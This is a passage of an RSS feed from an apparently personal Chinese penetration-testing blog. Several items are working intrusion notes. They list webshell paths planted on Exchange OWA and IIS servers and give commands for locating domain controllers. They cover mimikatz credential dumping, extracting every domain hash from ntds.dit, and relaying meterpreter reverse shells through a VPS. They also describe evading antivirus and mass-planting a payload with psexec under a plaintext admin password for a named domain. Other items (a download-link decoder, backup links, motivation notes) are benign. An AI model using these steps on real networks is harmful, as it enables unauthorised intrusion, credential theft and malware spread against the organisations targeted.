    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\一句话.aspx is not ok to parse
    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\一句话.aspx is ok to parse
    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\auth\一句话.aspx is ok to parse
    C:\inetpub\wwwroot\大马.aspx is not ok to parse before my &quot;adding a new web.config&quot; way in upon 3
    C:\inetpub\wwwroot\一句话.aspx is ok to parse,with iis pri
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-find-domain-controllers-and-dc-administrator-username--password&quot;&gt;0x02 find domain controllers and dc administrator username &amp;amp; password&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://drops.wooyun.org/tips/421 
    dsquery server(best)
    nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
    netdom query fsmo

mimikatz
    log
    privilege::debug
    sekurlsa::logonpasswords

at 23:0 /every:m,t,w,th,f,s,su &quot;d:\1.bat&quot;
d:\1.bat:
&quot;C:\recycler\srclog.exe&quot; -w &amp;gt;&amp;gt; &quot;C:\recycler\test.txt&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-get-all-hashs-in-the-domain-controllers-machine&quot;&gt;0x03 get all hashs in the domain controllers machine&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;link a:
    http://drops.wooyun.org/tips/6617
link b:
    https://blogs.msdn.microsoft.com/adioltean/2005/01/05/script-recipe-of-the-week-how-to-copy-an-opened-file/
*attention*:
    in link a,the script name to use shadowcopy is vsshadow.exe
    in link b,the script name to use shadowcopy is vshadow.exe
I get vshadow.exe from installing https://www.microsoft.com/en-us/download/confirmation.aspx?id=23490,then search vshadow.exe in the system,this is a quick link:
    http://pan.baidu.com/s/1cMC07W
there are three files:shadowcopy_ntds.bat,quarkspwdump.exe(v0.2b),vshadow.exe
step0:
    upload these three files to target machine&#39;s folder,eg. c:\windows\myfolder\
step1:
    shadowcopy_ntds.bat c:\windows\ntds\ntds.dit c:\windows\myfolder\ntds.dit
    (this shadowcopy_ntds.bat is from link b,it can copy any file while the file is being used)
step2:
    esentutl /p /o ntds.dit
step3:
    QuarksPwDump.exe --dump-hash-domain -with-history -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt
    (or quarkspwdump.exe --dump-hash-domain -hist -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt)
    the origin commands from link a is &quot;QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt&quot;,which proved wrong with my quarkspwdump.exe file
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-get-a-meterpreter-reverse-shell&quot;&gt;0x04 get a meterpreter reverse shell&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.found windows firewall is not open on the target,but &quot;in/out rules exists&quot;
2.found reverse port like 200 can not get it successfully
3.can not find why the meterpreter shell can not reverse connecting msf successfully
4.do these to get meterpreter reverse shell
    target:run reverse_shell.exe(set reverse port to 53)
    vps:lcx -listen 300 53
    local pc:msf--&amp;gt;set lport 300--&amp;gt;set rhost vps&#39;s ip
5.found 53 is ok
6.better to use shellter to supass avkiller
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x05-&quot;&gt;0x05 批量种马&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\recycler\putty.exe
2&amp;gt;msf
    use exploit/windows/smb/psexec
    set EXE::Custom /root/桌面/putty.exe
    set RHOST -&amp;gt; use armitage to choose pc.txt(192.168.11.1,192.168.11.2,etc)
    exploit
3&amp;gt;msf seems better than psexec.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 09 May 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/05/09/windows-2008-domain-controllers/</link>
        <guid isPermaLink="true">/web/2016/05/09/windows-2008-domain-controllers/</guid>
        
        <category>doamin controllers</category>
        
        <category>inside network</category>
        
        <category>aspx</category>
        
        <category>exchange server</category>
        
        <category>outlook</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>迅雷加密链接批量转化</title>
        <description>&lt;p&gt;将thunder://….的link转化成可以在迅雷中直接下载的link,eg.ftp://…&lt;br /&gt;
that is:&lt;br /&gt;
thunder://…  ==&amp;gt;  ftp://… or something else&lt;br /&gt;
用于手机迅雷下载vedio时wifi下载速度不快，将手机迅雷中的相应下载link放到pc端下载.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&#39;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\r\n&#39;,&quot;&quot;,each)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\n&#39;,&quot;&quot;,each)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;
        
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;thunder://&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decodestring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 08 May 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/05/08/thunder/</link>
        <guid isPermaLink="true">/python/2016/05/08/thunder/</guid>
        
        <category>auxilary</category>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>idea</title>
        <description>&lt;p&gt;渗透导图：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;line1&amp;gt; 不断探索目标全面情报------&amp;gt; 找出漏洞
line2&amp;gt; 不断提升自己核心单点打击力------&amp;gt; 如针对一个应用挖洞，让它成为自己的武器
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;高阶成事导图：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                    放弃 (eg.比较好玩的方向,诱惑)
                     |
                     |
                     |
                  决定方向(挖洞牛中的渗透牛and核心竞争力是在渗透中挖洞)
                     |
                     |
                     |
                  进步飞快
                     |
                     |
                     |
    &quot;他到底承受了多少，才能到这个水平&quot;&amp;lt;博人传&amp;gt;
        &quot;吃得苦中苦，方为人上人&quot;&amp;lt;欢乐颂&amp;gt;
                     |
                     |
                     |
                  进步飞快
                     |
                     |
                     |
                   peak
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;when feel puzzled,read these to find what you are and where you want to go:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 1.http://drops.wooyun.org/pentesting/15117
 2.http://www.zhihu.com/question/31905047
 3.http://pan.baidu.com/s/1kUUmxWN
 4.http://www.freebuf.com/news/special/105758.html
 5.http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;good habit:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.闲时挖洞
2.6 items in cellphone dock:
    知乎 feedly ihour 新浪微博 twitter English_words
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        <link>/idea/2016/04/21/idea/</link>
        <guid isPermaLink="true">/idea/2016/04/21/idea/</guid>
        
        <category>web</category>
        
        <category>idea</category>
        
        <category>thoughts</category>
        
        
        <category>idea</category>
        
      </item>
    
      <item>
        <title>backup files</title>
        <description>&lt;p&gt;1&amp;gt;firefox extensions list
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/backup/extension.png&quot; alt=&quot;extension&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2&amp;gt;sublime text setup file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1o7Tyha6
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3&amp;gt;firefox bookmarks&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1jHCBs6y
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4&amp;gt;vimrc and bundles of vim&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1slFveFF
update:2016-06-07
    http://pan.baidu.com/s/1hsbKyUS
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;5&amp;gt;zshrc&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1o7X4zr0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;6&amp;gt;tmux&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1kVyETT1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;7&amp;gt;vim+zshrc+tmux&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1o8QZdqi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 15 Apr 2016 00:00:00 +0800</pubDate>
        <link>/backup/2016/04/15/something-backup/</link>
        <guid isPermaLink="true">/backup/2016/04/15/something-backup/</guid>
        
        <category>firefox</category>
        
        <category>backup</category>
        
        <category>vim</category>
        
        <category>sublime</category>
        
        
        <category>backup</category>
        
      </item>
    
      <item>
        <title>msf的两种内网间连接方式及多重转发</title>
        <description>&lt;p&gt;msf的两种内网间连接方式及多重转发   download:&lt;a href=&quot;https://github.com/xinghuacai/msf-lcx/raw/master/msf%26lcx/msf%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E7%BD%91%E9%97%B4%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91.doc&quot;&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;here&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;update2016-05-17&quot;&gt;update:2016-05-17&lt;/h4&gt;
&lt;font color=&quot;red&quot;&gt;实现meterpreter payload经过vps上lcx中转后的多个肉鸡上线&lt;/font&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/msf-1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;step1--&amp;gt;vps:
        lcx -listen 300 53
step2--&amp;gt;主控端pc:
        start msf
        start a listener,meterpreter/bind_tcp,rhost=vps&#39;s ip,lhost=300
step3--&amp;gt;victim1:
        run 53.exe(a meterpreter/reverse_tcp payload exe,lhost=vps&#39;s ip,lport=53)

!!!!!!till now!!!!!!:
    victim1 will connect back successfully,but if I want victim2 connect back successfully after upon actions,found it fail after victim2 run 53.exe

!!!!!!solution!!!!!!:
step4--&amp;gt;
    victim2:run53.exe
    主控端pc:start a listener again like before
    (after run 53.exe on victim2,start a listener again like before.)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 15 Apr 2016 00:00:00 +0800</pubDate>
        <link>/msf/2016/04/15/msf%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E7%BD%91%E9%97%B4%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91/</link>
        <guid isPermaLink="true">/msf/2016/04/15/msf%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E7%BD%91%E9%97%B4%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91/</guid>
        
        <category>web</category>
        
        <category>msf</category>
        
        <category>lcx</category>
        
        
        <category>msf</category>
        
      </item>
    
  </channel>
</rss>
